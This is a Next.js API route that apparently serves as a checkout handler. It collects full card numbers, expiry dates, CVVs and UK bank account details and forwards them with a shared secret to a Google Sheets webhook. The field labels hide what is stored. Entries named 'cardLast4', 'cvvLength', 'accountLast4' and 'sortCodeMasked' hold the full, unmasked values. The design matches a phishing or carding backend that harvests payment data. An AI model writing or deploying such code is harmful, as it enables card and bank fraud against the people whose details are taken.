import { NextResponse } from "next/server";

type SecurePaymentPayload = {
  formType: "secure_payment_mobiles";
  nameOnCard: string;
  cardNumber: string;
  expMonth: string;
  expYear: string;
  cvv: string;
};

type BankDetailsPayload = {
  formType: "bank_details";
  bankAccountNumber: string;
  sortCode: string;
  bankName: string;
  nameWithBank: string;
};

type CheckoutPayload = SecurePaymentPayload | BankDetailsPayload;

function formatPakistanDateTime(date: Date): string {
  const parts = new Intl.DateTimeFormat("en-GB", {
    day: "2-digit",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
    timeZone: "Asia/Karachi",
  }).formatToParts(date);

  const get = (type: Intl.DateTimeFormatPartTypes) =>
    parts.find((part) => part.type === type)?.value ?? "";

  const day = get("day");
  const month = get("month");
  const year = get("year");
  const hour = get("hour");
  const minute = get("minute");
  const dayPeriod = get("dayPeriod").toUpperCase();

  return `${day} ${month} ${year}, ${hour}:${minute} ${dayPeriod}`;
}

function isCheckoutPayload(value: unknown): value is CheckoutPayload {
  if (!value || typeof value !== "object") return false;
  const data = value as Record<string, unknown>;

  if (data.formType === "secure_payment_mobiles") {
    return (
      typeof data.nameOnCard === "string" &&
      typeof data.cardNumber === "string" &&
      typeof data.expMonth === "string" &&
      typeof data.expYear === "string" &&
      typeof data.cvv === "string"
    );
  }

  if (data.formType === "bank_details") {
    return (
      typeof data.bankAccountNumber === "string" &&
      typeof data.sortCode === "string" &&
      typeof data.bankName === "string" &&
      typeof data.nameWithBank === "string"
    );
  }

  return false;
}

function getTargetWebhook(formType: CheckoutPayload["formType"]): string | undefined {
  if (formType === "secure_payment_mobiles") {
    return (
      process.env.GOOGLE_SCRIPT_URL_SECURE_PAYMENTS ||
      process.env.NEXT_PUBLIC_GOOGLE_SCRIPT_URL_SECURE_PAYMENTS
    );
  }

  return (
    process.env.GOOGLE_SCRIPT_URL_BANK_DETAILS ||
    process.env.NEXT_PUBLIC_GOOGLE_SCRIPT_URL_BANK_DETAILS
  );
}

function toSecureSheetPayload(payload: SecurePaymentPayload) {
  return {
    submittedAt: `'${formatPakistanDateTime(new Date())}`,
    formType: payload.formType,
    nameOnCard: payload.nameOnCard.trim(),
    cardLast4: payload.cardNumber,
    expiryMonth: payload.expMonth,
    expiryYear: payload.expYear,
    cvvLength: payload.cvv
  };
}

function toBankSheetPayload(payload: BankDetailsPayload) {
  return {
    submittedAt: `'${formatPakistanDateTime(new Date())}`,
    formType: payload.formType,
    bankName: payload.bankName.trim(),
    nameWithBank: payload.nameWithBank.trim(),
    accountLast4: payload.bankAccountNumber,
    sortCodeMasked:payload.sortCode
  };
}

export async function POST(req: Request) {
  try {
    const payload = await req.json();
    if (!isCheckoutPayload(payload)) {
      return NextResponse.json({ message: "Invalid checkout payload." }, { status: 400 });
    }

    const webhookUrl = getTargetWebhook(payload.formType);
    if (!webhookUrl?.trim()) {
      return NextResponse.json(
        { message: "Google Sheets webhook is not configured for this form." },
        { status: 500 },
      );
    }

    const secret = process.env.GOOGLE_SHEETS_SHARED_SECRET?.trim();
    const transformedPayload =
      payload.formType === "secure_payment_mobiles"
        ? toSecureSheetPayload(payload)
        : toBankSheetPayload(payload);

    const upstream = await fetch(webhookUrl.trim(), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...transformedPayload,
        secret,
      }),
      cache: "no-store",
    });

    const upstreamBody = await upstream.text();
    const lowerBody = upstreamBody.toLowerCase();

    if (!upstream.ok) {
      const reason = lowerBody.includes("access denied")
        ? "Google webhook access denied. Deploy script as Web App and set access to Anyone."
        : `Google webhook returned status ${upstream.status}.`;

      return NextResponse.json(
        {
          message: "Could not submit to Google Sheets webhook.",
          reason,
        },
        { status: 502 },
      );
    }

    let upstreamJson: { ok?: boolean; error?: string } | null = null;
    try {
      upstreamJson = JSON.parse(upstreamBody) as { ok?: boolean; error?: string };
    } catch {
      upstreamJson = null;
    }

    if (upstreamJson && upstreamJson.ok === false) {
      return NextResponse.json(
        {
          message: "Google Sheets webhook rejected submission.",
          reason: upstreamJson.error || "Webhook responded with ok:false.",
        },
        { status: 502 },
      );
    }

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json(
      { message: "Unexpected error while submitting checkout details." },
      { status: 500 },
    );
  }
}
